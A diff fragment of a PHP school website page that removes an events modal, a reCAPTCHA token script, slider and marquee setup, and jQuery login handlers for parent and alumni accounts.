-              <!--<input type="submit" value="LOgin" id="login" style=" padding: 8px 19px;"/>-->
-              <input type="hidden" value="Y"  name="logMe" id="logMe" />
-              <input type="submit" value="Send Password" id="resister" />
-              <div class="clearfix"></div>
-            </form>
-          </div>
-        </div>
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-      </div>
-    </div>
-  </div>
-</div>
-<?php
-            $tsql_modal = "SELECT id, title, description, status FROM tbl_events WHERE status = 1 ORDER BY id ASC LIMIT 0,1";
-            //echo $tsql_modal; die('sd');
-            $rs_modal = $objCurPage->link_id->query($tsql_modal);
-            if((!$rs_modal) || (!$rec_modal = $rs_modal->fetch_array())){
-            }else{
-               
-      ?>
-<!-- Modal -->
-<div id="admEvents" class="modal fade" role="dialog">
-  <div class="modal-dialog" style="width:620px;">
-    <div class="modal-content">
-	  <a href="javascript:void(0);" class="close" data-dismiss="modal">&times;</a>
-      <div class="modal-body">
-	  <?php if($rec_modal['title'] != "" && $rec_modal['title'] != "-"){ ?>
-        <h3 class="modal-title"><?php echo stripslashes($rec_modal['title']); ?></h3>
-	  <?php } ?>
-       <?php /* ?> <p><center><?php echo str_replace("../" ,"",stripslashes($rec_modal['description'])); ?></center></p><?php */ ?>
-		<div style="text-align:center;">
-			<?php $content = stripslashes($rec_modal['description']);
-$content = str_replace(["<p>", "</p>"], "", $content);
-echo str_replace("../", "", $content); ?>
-		</div>
-      </div>
-    </div>
-  </div>
-</div>
-<?php } ?>
-
-<?php include_once("footer.php"); ?>
-
-<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
-<script type="text/javascript" src="js/jquery.themepunch.tools.min.js"></script>
-<script type="text/javascript" src="js/jquery.themepunch.revolution.min.js"></script>
-<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
-<script type="text/javascript" src="js/jquery.validate.js"></script>
-<script type="text/javascript" src="js/forgot.js"></script>
-<script type="text/javascript" src="js/jquery.marquee.js"></script>
-
-<script>
-grecaptcha.ready(function() {  
-    grecaptcha.execute('6LdIcksrAAAAAP4deBhfQ0umKbptb8mbIjEbV-cS', {action: 'submit'}).then(function(token) {
-        // Add token to the form
-        document.getElementById('token').value = token;
-    });
-});
-</script>
-
-<script type="text/javascript">  
-	$(function(){
-		$('#marquee-vertical').marquee();  
-		$('#marquee-horizontal').marquee({direction:'horizontal', delay:0, timing:50});
-	  
-		window.onkeydown = function( event ) {
-			if ( event.keyCode == 27 ) {
-				//console.log( 'escape pressed' );
-				$('#admEvents').modal('hide');
-			}
-		};
-	});
-</script>
-<!-- THE SCRIPT INITIALISATION -->
-<!-- LOOK THE DOCUMENTATION FOR MORE INFORMATIONS -->
-<script type="text/javascript">
-	var revapi;
-	jQuery(document).ready(function () {
-		
-		$('#admEvents').modal('show');
-		
-		$('.carousel').carousel({
-			interval: 3000
-		});
-		
-		revapi = jQuery('.tp-banner').revolution(
-		{
-			delay: 3000,
-			//startwidth: 1170,
-			//startheight: 380,
-			hideThumbs: 10,
-			fullWidth: "on",
-			forceFullWidth: "on"
-		});
-	});	//ready
-	
-
-</script>
-<!-- END REVOLUTION SLIDER -->
-<script type="text/javascript">
-
-	$(function(){
-		$("#uname").validate({
-			expression: "if (VAL) return true; else return false;",
-			message: "Name must be provided"
-		});
-		$("#pwd").validate({
-			expression: "if (VAL) return true; else return false;",
-			message: "Password must be provided"
-		});	
-		
-		$("#email").validate({
-			expression: "if (VAL) return true; else return false;",
-			message: "Email must be provided"
-		});	
-		
-		$("#alumni_pwd").validate({
-			expression: "if (VAL) return true; else return false;",
-			message: "Password must be provided"
-		});	
-	});
-
-</script>
-<script type="text/javascript">
-	$(document).ready(function(){  
-		$('#frmParentsLogin').submit(function(){
-			validateSend();
-			return false;	
-		});		
-		$('#frmAlumniLogin').submit(function(){
-			validateAlumniSend();
-			return false;	
-		});				
-	});
-	
-	//ALUMNI LOGIN
-	function validateAlumniSend()
-	{
-		if($('#email').val() != "" && $('#alumni_pwd').val() != "")
-		{	
-			$.post('ajax-new/ajax_alumnilogin.php', $("#frmAlumniLogin").serialize(), function(data) {	
-				if (data[0].resSuccess == 1) 
-				{
-					window.location.href = "alumni/profile.php";					
-					return false;	
-				}
-				else if(data[0].resSuccess == 2)
-				{
-					if(data[0].errtype == 'Validation')
-					{
-						for(i=0; i<data[0].arrError.length; i++)
-						{
-							$('#spn_' + data[0].arrError[i][0]).remove();		
-							$("#" + data[0].arrError[i][0] ).after("<div id='spn_" + data[0].arrError[i][0] + "' class='div-spn-error'>" + data[0].arrError[i][1] + "</div>");
-						}						
-					}
-					else{
-						$('.errMsgText').html(data[0].msg);	
-						$('#usrpwd').val('');
-					}
-					return false;
-				}
-				else
-				{
-					return false;
-				}
-			});
-		}
-	}
-	function validateSend()
-	{
-		if($('#uname').val() != "" && $('#pwd').val() != "")
-		{		
-			$.post('ajax/ajax_login.php', $("#frmParentsLogin").serialize(), function(data) {						
-									
-				if (data[0].resSuccess == 1) 
-				{
-					window.location.href = "parents/studetails.php";
-										
-					return false;	
-				}
-				else if (data[0].resSuccess == 2) 
-				{
-					if(data[0].errtype == 'Validation')
-					{
-					 for(i=0; i<data[0].arrError.length; i++)
-						{
-							$('#spn_' + data[0].arrError[i][0]).remove();		
-							$("#" + data[0].arrError[i][0] ).after("<div id='spn_" + data[0].arrError[i][0] + "' class='div-spn-error'>" + data[0].arrError[i][1] + "</div>");
-						}	
-					}
-					else
-					{
-						$('.errMsgText').html(data[0].msg);	
-						$('#usrpwd').val('');	
-					}
-					
-					return false;	
-				}					
-				else
-				{
-					return false;
-				}
-				
-			 });
-		}	
-	}	
-</script>
-<script type="text/javascript" src="ticker/jquery.carouselTicker.js"></script>
-<script type="text/javascript" src="ticker/start.js"></script>
-</body>
+  </body>
 </html>
